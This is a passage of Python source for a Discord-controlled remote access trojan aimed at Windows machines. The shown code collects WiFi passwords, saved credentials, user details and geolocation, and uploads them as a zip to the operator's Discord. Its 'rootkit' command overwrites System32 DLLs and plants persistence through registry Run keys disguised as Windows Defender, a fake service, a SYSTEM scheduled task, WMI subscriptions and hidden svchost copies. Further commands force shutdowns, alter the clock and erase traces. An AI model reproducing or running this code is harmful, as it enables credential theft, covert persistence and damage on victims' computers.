                f.write(f"🏢 ISP: {geo.get('ISP', 'Unknown')}\n")

                if "Organization" in geo:
                    f.write(f"🏛️ Organization: {geo.get('Organization', 'Unknown')}\n")
                if "AS Number" in geo:
                    f.write(f"🌐 AS Number: {geo.get('AS Number', 'Unknown')}\n")

                f.write(f"⏰ Timezone: {geo.get('Timezone', 'Unknown')}\n")
                f.write(f"📍 Coordinates: {geo.get('Coordinates', 'Unknown')}\n\n")

            f.write(f"📌 Network Interfaces\n")
            f.write(f"{'─'*30}\n")

            for interface, addresses in all_info["NETWORK"]["Interfaces"].items():
                f.write(f"🔌 Interface: {interface}\n")

                for addr in addresses:
                    if "IP" in addr:
                        f.write(f"  📡 IPv4: {addr['IP']}\n")
                        if "Netmask" in addr:
                            f.write(f"     Netmask: {addr['Netmask']}\n")
                        if "Broadcast" in addr:
                            f.write(f"     Broadcast: {addr['Broadcast']}\n")
                    elif "IPv6" in addr:
                        f.write(f"  📡 IPv6: {addr['IPv6']}\n")
                    elif "MAC" in addr:
                        f.write(f"  💳 MAC: {addr['MAC']}\n")
                f.write("\n")

            f.write(f"📌 WiFi Networks\n")
            f.write(f"{'─'*30}\n")

            for name, wifi_data in all_info["NETWORK"]["WiFi Profiles"].items():
                if isinstance(wifi_data, dict):
                    f.write(f"📶 {name}\n")
                    f.write(f"  🔐 Authentication: {wifi_data.get('Authentication', 'Unknown')}\n")
                    f.write(f"  🔒 Encryption: {wifi_data.get('Encryption', 'Unknown')}\n")
                    f.write(f"  🔑 Password: {wifi_data.get('Password', 'No password found')}\n")
                else:
                    f.write(f"📶 {name}: {wifi_data}\n")
                f.write("\n")

        wifi_passwords_path = os.path.join(temp_dir, "network", "wifi_passwords.txt")
        with open(wifi_passwords_path, 'w', encoding='utf-8') as f:
            f.write(f"{'='*50}\n")
            f.write(f"{' '*15}WIFI PASSWORDS\n")
            f.write(f"{'='*50}\n\n")

            for name, wifi_data in all_info["NETWORK"]["WiFi Profiles"].items():
                password = wifi_data.get('Password', 'No password found') if isinstance(wifi_data, dict) else wifi_data
                f.write(f"📶 {name}: {password}\n")

        personal_path = os.path.join(temp_dir, "personal", "user_info.txt")
        with open(personal_path, 'w', encoding='utf-8') as f:
            f.write(f"{'='*50}\n")
            f.write(f"{' '*15}USER INFORMATION\n")
            f.write(f"{'='*50}\n\n")

            f.write(f"📌 Account Information\n")
            f.write(f"{'─'*30}\n")
            f.write(f"👤 Username: {all_info['USER']['Username']}\n")

            if "Full Name" in all_info['USER']:
                f.write(f"📛 Full Name: {all_info['USER']['Full Name']}\n")
            if "SID" in all_info['USER']:
                f.write(f"🆔 SID: {all_info['USER']['SID']}\n")
            if "Domain" in all_info['USER']:
                f.write(f"🏢 Domain: {all_info['USER']['Domain']}\n")
            if "Account Type" in all_info['USER']:
                f.write(f"🔑 Account Type: {all_info['USER']['Account Type']}\n")
            if "Status" in all_info['USER']:
                f.write(f"⚙️ Status: {all_info['USER']['Status']}\n")
            f.write("\n")

            f.write(f"📌 User Directories\n")
            f.write(f"{'─'*30}\n")
            f.write(f"🏠 Home Directory: {all_info['USER']['Home Directory']}\n")
            f.write(f"📄 Documents Path: {all_info['USER']['Documents Path']}\n")
            f.write(f"🖥️ Desktop Path: {all_info['USER']['Desktop Path']}\n")
            f.write(f"📩 Downloads Path: {all_info['USER']['Downloads Path']}\n")
            f.write(f"🖼️ Pictures Path: {all_info['USER']['Pictures Path']}\n")
            f.write(f"🎵 Music Path: {all_info['USER']['Music Path']}\n")
            f.write(f"🎬 Videos Path: {all_info['USER']['Videos Path']}\n\n")

            if "Recent Files" in all_info["USER"] and isinstance(all_info["USER"]["Recent Files"], list):
                f.write(f"📌 Recent Activity\n")
                f.write(f"{'─'*30}\n")

                if len(all_info["USER"]["Recent Files"]) > 0:
                    for i, file in enumerate(all_info["USER"]["Recent Files"][:30]):  
                        f.write(f"📄 {i+1}. {file}\n")

                    if len(all_info["USER"]["Recent Files"]) > 30:
                        f.write(f"\n... and {len(all_info['USER']['Recent Files'])-30} more files\n")
                    else:
                        f.write("No recent files found\n")

        security_path = os.path.join(temp_dir, "security", "security_overview.txt")
        with open(security_path, 'w', encoding='utf-8') as f:
            f.write(f"{'='*50}\n")
            f.write(f"{' '*15}SECURITY INFORMATION\n")
            f.write(f"{'='*50}\n\n")

            f.write(f"📌 Security Settings\n")
            f.write(f"{'─'*30}\n")

            if "Windows Defender" in all_info["SECURITY"]:
                defender_status = all_info["SECURITY"]["Windows Defender"]
                icon = "✅" if defender_status == "Enabled" else "❌"
                f.write(f"{icon} Windows Defender: {defender_status}\n")

            if "Firewall" in all_info["SECURITY"]:
                firewall_status = all_info["SECURITY"]["Firewall"]
                icon = "✅" if firewall_status == "Enabled" else "❌"
                f.write(f"{icon} Firewall: {firewall_status}\n")

            if "UAC" in all_info["SECURITY"]:
                uac_status = all_info["SECURITY"]["UAC"]
                icon = "✅" if uac_status == "Enabled" else "❌"
                f.write(f"{icon} User Account Control: {uac_status}\n\n")

            f.write(f"📌 Saved Credentials\n")
            f.write(f"{'─'*30}\n")

            if "Saved Credentials" in all_info["SECURITY"]:
                creds = all_info["SECURITY"]["Saved Credentials"]
                if isinstance(creds, list) and len(creds) > 0:
                    for cred in creds:
                        f.write(f"🔑 {cred}\n")
                else:
                    f.write("No saved credentials found\n")

        zip_path = "system_info.zip"
        shutil.make_archive("system_info", "zip", temp_dir)

        embed.description = "Uploading system information..."
        await status_msg.edit(embed=embed)

        await ctx.send(file=discord.File(zip_path))

        embed.title = "✅ Advanced System Information"
        embed.description = "System information has been collected and uploaded."
        embed.color = SOLARA_PURPLE

        embed.add_field(
            name="System",
            value=f"OS: {all_info['SYSTEM']['OS']}\nUser: {all_info['SYSTEM']['Current User']}",
            inline=True
        )

        embed.add_field(
            name="Hardware",
            value=f"CPU: {all_info['HARDWARE']['CPU']['Physical Cores']} cores\nRAM: {all_info['HARDWARE']['Memory']['Total']}",
            inline=True
        )

        embed.add_field(
            name="Network",
            value=f"IP: {all_info['NETWORK'].get('Public IP', 'Unknown')}\nInterfaces: {len(all_info['NETWORK']['Interfaces'])}",
            inline=True
        )

        if "Geolocation" in all_info["NETWORK"]:
            geo = all_info["NETWORK"]["Geolocation"]
            embed.add_field(
                name="Location",
                value=f"{geo.get('City', 'Unknown')}, {geo.get('Region', 'Unknown')}, {geo.get('Country', 'Unknown')}",
                inline=True
            )

        embed.add_field(
            name="WiFi",
            value=f"Profiles: {len(all_info['NETWORK']['WiFi Profiles'])}",
            inline=True
        )

        if "Recent Files" in all_info["USER"] and isinstance(all_info["USER"]["Recent Files"], list):
            embed.add_field(
                name="Recent Activity",
                value=f"Files: {len(all_info['USER']['Recent Files'])}",
                inline=True
            )

        await status_msg.edit(embed=embed)

        try:
            shutil.rmtree(temp_dir)
            os.remove(zip_path)
        except:
            pass

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Information Collection Error",
            description=f"An error occurred: {str(e)}",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='destroy')
async def destroy_program(ctx):
    """Remove all traces of the program from the system"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        script_path = os.path.abspath(__file__)
        appdata = os.getenv('APPDATA')
        startup_path = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        system32_path = os.path.join(os.getenv('SYSTEMROOT'), "System32", "drivers", "etc")

        embed = discord.Embed(
            title="🗑️ Self-Destruct Initiated",
            description="Removing all traces of the program...",
            color=SOLARA_ERROR,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        cleanup_tasks = []

        hidden_files = [
            os.path.join(appdata, "winsys32.pyw"),
            os.path.join(startup_path, "mscore.pyw"),
            os.path.join(system32_path, "netdrv.pyw")
        ]

        for file in hidden_files:
            try:
                if os.path.exists(file):
                    os.remove(file)
                    cleanup_tasks.append(f"✅ Removed {os.path.basename(file)}")
            except:
                cleanup_tasks.append(f"❌ Failed to remove {os.path.basename(file)}")

        reg_entries = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")
        ]

        for reg_root, reg_path in reg_entries:
            try:
                key = winreg.OpenKey(reg_root, reg_path, 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, "WindowsDefender")
                winreg.CloseKey(key)
                cleanup_tasks.append(f"✅ Removed registry entry from {reg_path}")
            except:
                cleanup_tasks.append(f"❌ Failed to remove registry entry from {reg_path}")

        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        dll_backup = os.path.join(system32, "cryptbase.dll.backup")
        if os.path.exists(dll_backup):
            try:
                os.remove(os.path.join(system32, "cryptbase.dll"))
                os.rename(dll_backup, os.path.join(system32, "cryptbase.dll"))
                cleanup_tasks.append("✅ Restored system DLL")
            except:
                cleanup_tasks.append("❌ Failed to restore system DLL")

        try:
            output = subprocess.check_output("schtasks /query /fo csv", shell=True).decode()
            for line in output.split('\n'):
                if "SolaraUpdate" in line:
                    task_name = line.split(',')[0].strip('"')
                    subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True)
                    cleanup_tasks.append(f"✅ Removed scheduled task {task_name}")
        except:
            cleanup_tasks.append("❌ Failed to remove scheduled tasks")

        try:

            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            cleanup_tasks.append("✅ Re-enabled Task Manager")
        except:
            cleanup_tasks.append("❌ Failed to re-enable Task Manager")

        final_embed = discord.Embed(
            title="🗑️ Self-Destruct Complete",
            description="Program cleanup finished",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )

        for i in range(0, len(cleanup_tasks), 25):
            field_tasks = cleanup_tasks[i:i+25]
            final_embed.add_field(
                name=f"Cleanup Tasks {i+1}-{i+len(field_tasks)}",
                value="\n".join(field_tasks),
                inline=False
            )

        await msg.edit(embed=final_embed)

        try:

            def delayed_delete():
                time.sleep(2)
                os.remove(script_path)

            threading.Thread(target=delayed_delete, daemon=True).start()
        except:
            pass

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Self-Destruct Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='rootkit')
async def install_rootkit(ctx):
    """Install advanced stealth and persistence mechanisms"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        script_path = os.path.abspath(__file__)
        system32 = os.path.join(os.environ['SystemRoot'], 'System32')

        embed = discord.Embed(
            title="🔒 Rootkit Installation",
            description="Installing advanced persistence...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        results = []

        critical_dlls = {
            "cryptbase.dll": "CryptBase",
            "uxtheme.dll": "Windows Theme API",
            "wininet.dll": "Internet API"
        }

        for dll_name, description in critical_dlls.items():
            try:
                dll_path = os.path.join(system32, dll_name)
                backup_path = dll_path + ".backup"

                if not os.path.exists(backup_path):
                    if os.path.exists(dll_path):

                        shutil.copy2(dll_path, backup_path)

                    with open(dll_path, "w") as f:
                        f.write(f'start "" "pythonw" "{script_path}"')

                results.append(f"✅ Hijacked {description}")
            except:
                results.append(f"❌ Failed to hijack {description}")

        reg_locations = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs")
        ]

        for reg_root, reg_path in reg_locations:
            try:
                key = winreg.CreateKeyEx(reg_root, reg_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
                winreg.CloseKey(key)
                results.append(f"✅ Added deep registry persistence to {reg_path}")
            except:
                results.append(f"❌ Failed to add registry persistence to {reg_path}")

        try:
            service_name = "WindowsSystemHost"
            service_cmd = f'sc create "{service_name}" binPath= "pythonw {script_path}" start= auto'
            subprocess.run(service_cmd, shell=True, capture_output=True)
            subprocess.run(f'sc description "{service_name}" "Critical system service for Windows security"', shell=True)
            results.append("✅ Installed system service")
        except:
            results.append("❌ Failed to install system service")

        try:
            task_name = "WindowsUpdateManager"
            cmd = f'schtasks /create /tn "{task_name}" /tr "pythonw {script_path}" /sc onstart /ru System /rl HIGHEST /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            results.append("✅ Created system-level scheduled task")
        except:
            results.append("❌ Failed to create scheduled task")

        try:

            wmi_script = f'''
            $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                Name = "WindowsEventMonitor"
                EventNamespace = "root\\cimv2"
                QueryLanguage = "WQL"
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            }}
            $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                Name = "WindowsEventMonitor"
                ExecutablePath = "pythonw"
                CommandLineTemplate = "{script_path}"
            }}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                Filter = $Filter
                Consumer = $Consumer
            }}
            '''

            with open("wmiscript.ps1", "w") as f:
                f.write(wmi_script)

            subprocess.run("powershell -ExecutionPolicy Bypass -File wmiscript.ps1", shell=True)
            os.remove("wmiscript.ps1")
            results.append("✅ Created WMI event subscription")
        except:
            results.append("❌ Failed to create WMI subscription")

        try:

            system_locations = [
                os.path.join(system32, "drivers", "etc"),
                os.path.join(system32, "wbem"),
                os.path.join(system32, "WindowsPowerShell", "v1.0"),
                os.path.join(os.environ['SYSTEMROOT'], "SysWOW64"),
                os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            ]

            for location in system_locations:
                if os.path.exists(location):
                    dest = os.path.join(location, "svchost.pyw")
                    shutil.copy2(script_path, dest)

                    ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
                    results.append(f"✅ Hidden copy in {location}")
        except:
            results.append("❌ Failed to create hidden copies")

        final_embed = discord.Embed(
            title="🔒 Rootkit Installation Complete",
            description="Advanced persistence mechanisms installed",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )

        for i in range(0, len(results), 25):
            field_results = results[i:i+25]
            final_embed.add_field(
                name=f"Installation Results {i+1}-{i+len(field_results)}",
                value="\n".join(field_results),
                inline=False
            )

        await msg.edit(embed=final_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Rootkit Installation Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='website')
async def open_website(ctx, *, url=None):
    """Open a website in the user's browser"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if not url:
            await ctx.send("Please provide a URL to open")
            return

        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        embed = discord.Embed(
            title="🌐 Opening Website",
            description=f"Opening URL: `{url}`",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        try:

            webbrowser.open(url, new=2)
        except:
            try:

                subprocess.run(f'start "" "{url}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                try:

                    ps_command = f'Start-Process "{url}"'
                    subprocess.run(['powershell', '-Command', ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    raise Exception("Failed to open website")

        success_embed = discord.Embed(
            title="✅ Website Opened",
            description=f"Successfully opened: `{url}`",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )
        await msg.edit(embed=success_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Website Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='snake')
async def desktop_snake(ctx, duration: int = 30):
    """Animate desktop icons in a snake pattern"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🐍 Desktop Snake Animation",
            description=f"Starting snake animation for {duration} seconds...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        desktop = win32gui.GetDesktopWindow()
        dc = win32gui.GetWindowDC(desktop)
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)

        def enum_windows_callback(hwnd, icons):
            if win32gui.GetClassName(hwnd) == "SysListView32" and "Program Manager" in win32gui.GetWindowText(win32gui.GetParent(hwnd)):
                icons.append(hwnd)
                return False
            return True

        icons = []
        win32gui.EnumWindows(enum_windows_callback, icons)

        if not icons:
            await msg.edit(embed=discord.Embed(
                title="❌ Snake Error",
                description="No desktop icons found",
                color=SOLARA_ERROR
            ))
            return

        icon_hwnd = icons[0]

        icon_positions = []
        def enum_items_callback(hwnd, param):
            if win32gui.IsWindowVisible(hwnd):
                rect = win32gui.GetWindowRect(hwnd)
                icon_positions.append((hwnd, rect))

        win32gui.EnumChildWindows(icon_hwnd, enum_items_callback, None)

        if not icon_positions:
            await msg.edit(embed=discord.Embed(
                title="❌ Snake Error",
                description="No visible icons found",
                color=SOLARA_ERROR
            ))
            return

        original_positions = icon_positions.copy()

        snake_length = len(icon_positions)
        angle = 0
        center_x = screen_width // 2
        center_y = screen_height // 2
        radius = min(screen_width, screen_height) // 4
        speed = 2

        start_time = time.time()

        def snake_animation():
            nonlocal angle
            while time.time() - start_time < duration:

                for i, (hwnd, _) in enumerate(icon_positions):

                    phase = i * (2 * math.pi / snake_length)

                    r = radius * (1 + i / snake_length)
                    x = int(center_x + r * math.cos(angle + phase))
                    y = int(center_y + r * math.sin(angle + phase))

                    try:
                        win32gui.SetWindowPos(hwnd, None, x, y, 0, 0, 
                            win32con.SWP_NOSIZE | win32con.SWP_NOZORDER | win32con.SWP_NOACTIVATE)
                    except:
                        continue

                angle += speed * 0.05
                time.sleep(0.05)

            for (hwnd, original_rect), (_, _) in zip(original_positions, icon_positions):
                try:
                    win32gui.SetWindowPos(hwnd, None, 
                        original_rect[0], original_rect[1],
                        original_rect[2] - original_rect[0],
                        original_rect[3] - original_rect[1],
                        win32con.SWP_NOZORDER | win32con.SWP_NOACTIVATE)
                except:
                    continue

        threading.Thread(target=snake_animation, daemon=True).start()

        await msg.edit(embed=discord.Embed(
            title="🐍 Snake Animation Active",
            description=f"Desktop icons are slithering...\nDuration: {duration} seconds",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        ))

        await asyncio.sleep(duration)

        await msg.edit(embed=discord.Embed(
            title="✅ Snake Animation Complete",
            description="Desktop icons restored to original positions",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        ))

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Snake Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='shutdown')
async def shutdown_system(ctx, delay: int = 0, force: bool = False):
    """Shutdown the system"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        cmd = ['shutdown']

        cmd.extend(['/s'])  
        if force:
            cmd.append('/f')  
        cmd.extend(['/t', str(delay)])  
        cmd.append('/d', 'p:0:0')  
        cmd.append('/c', "Remote shutdown initiated")  

        embed = discord.Embed(
            title="🔌 System Shutdown",
            description=f"Initiating shutdown{f' in {delay} seconds' if delay > 0 else ' immediately'}{' (Force)' if force else ''}...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed)

        subprocess.run(' '.join(cmd), shell=True, capture_output=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Shutdown Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='reboot')
async def reboot_system(ctx, delay: int = 0, force: bool = False):
    """Reboot the system"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        cmd = ['shutdown']

        cmd.extend(['/r'])  
        if force:
            cmd.append('/f')  
        cmd.extend(['/t', str(delay)])  
        cmd.append('/d', 'p:0:0')  
        cmd.append('/c', "Remote restart initiated")  

        embed = discord.Embed(
            title="🔄 System Reboot",
            description=f"Initiating reboot{f' in {delay} seconds' if delay > 0 else ' immediately'}{' (Force)' if force else ''}...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed)

        subprocess.run(' '.join(cmd), shell=True, capture_output=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Reboot Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='logoff')
async def logoff_system(ctx, force: bool = False):
    """Log off the current user"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        cmd = ['shutdown']
        cmd.extend(['/l'])  
        if force:
            cmd.append('/f')  

        embed = discord.Embed(
            title="👋 User Logoff",
            description=f"Initiating logoff{' (Force)' if force else ''}...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed)

        subprocess.run(' '.join(cmd), shell=True, capture_output=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Logoff Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='cancel')
async def cancel_shutdown(ctx):
    """Cancel pending shutdown/reboot"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        subprocess.run('shutdown /a', shell=True, capture_output=True)

        embed = discord.Embed(
            title="✅ Shutdown Cancelled",
            description="Cancelled pending shutdown/reboot",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Cancel Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='timetraveler')
async def time_traveler(ctx, *, args=None):
    """Sets the system clock back or forward to confuse about time

    Usage:
    !timetraveler hours=5 (shifts 5 hours forward)
    !timetraveler hours=-3 (shifts 3 hours back)
    !timetraveler days=2 (shifts 2 days forward)
    !timetraveler days=-1 (shifts 1 day back)
    """
    if ctx.author.id != OWNER_ID:
        return

    try:
        hours = None
        days = None

        if args:
            args_parts = args.split()
            for part in args_parts:
                if part.startswith('hours='):
                    try:
                        hours = int(part.split('=')[1])
                    except (ValueError, IndexError):
                        pass
                elif part.startswith('days='):
                    try:
                        days = int(part.split('=')[1])
                    except (ValueError, IndexError):
                        pass

        if hours is None and days is None:

            hours = random.randint(-12, 12)

        total_seconds = 0
        if hours is not None:
            total_seconds += hours * 3600  
        if days is not None:
            total_seconds += days * 86400  

        current_time = time.time()
        new_time = current_time + total_seconds

        current_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(current_time))
        new_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(new_time))

        new_time_tuple = time.localtime(new_time)

        class SYSTEMTIME(ctypes.Structure):
            _fields_ = [
                ('wYear', ctypes.c_uint16),
                ('wMonth', ctypes.c_uint16),
                ('wDayOfWeek', ctypes.c_uint16),
                ('wDay', ctypes.c_uint16),
                ('wHour', ctypes.c_uint16),
                ('wMinute', ctypes.c_uint16),
                ('wSecond', ctypes.c_uint16),
                ('wMilliseconds', ctypes.c_uint16)
            ]

        system_time = SYSTEMTIME()
        system_time.wYear = new_time_tuple.tm_year
        system_time.wMonth = new_time_tuple.tm_mon
        system_time.wDay = new_time_tuple.tm_mday
        system_time.wHour = new_time_tuple.tm_hour
        system_time.wMinute = new_time_tuple.tm_min
        system_time.wSecond = new_time_tuple.tm_sec
        system_time.wMilliseconds = 0

        result = windll.kernel32.SetSystemTime(ctypes.byref(system_time))

        if result == 0:

            result = windll.kernel32.SetLocalTime(ctypes.byref(system_time))

        if result == 0:
            await ctx.send(embed=discord.Embed(
                title="⚠️ Time Travel Failed",
                description="Could not set system time. Make sure the bot has admin privileges.",
                color=SOLARA_ERROR
            ))
            return

        embed = discord.Embed(
            title="🕰️ Time Travel Successful",
            description=f"System clock has been altered!",
            color=SOLARA_PURPLE
        )
        embed.add_field(name="Original Time", value=current_time_str, inline=False)
        embed.add_field(name="New Time", value=new_time_str, inline=False)

        if hours is not None and hours != 0:
            embed.add_field(name="Hours Shifted", value=f"{hours:+d}", inline=True)
        if days is not None and days != 0:
            embed.add_field(name="Days Shifted", value=f"{days:+d}", inline=True)

        embed.set_footer(text="Note: This may affect scheduled tasks and timestamps")

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Time Travel Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

MAX_RETRIES = 5
retry_count = 0
base_delay = 1

while retry_count < MAX_RETRIES:
    try:
        print(f"Attempting to connect... (Attempt {retry_count + 1}/{MAX_RETRIES})")
        _c.run(TOKEN)
        break  
    except discord.LoginFailure as e:
        print(f"Login failed: {e}")
        break  
    except Exception as e:
        retry_count += 1
        delay = base_delay * (2 ** retry_count)  
        print(f"Connection failed: {e}")
        print(f"Retrying in {delay} seconds...")
        time.sleep(delay)  

print("Bot stopped running")
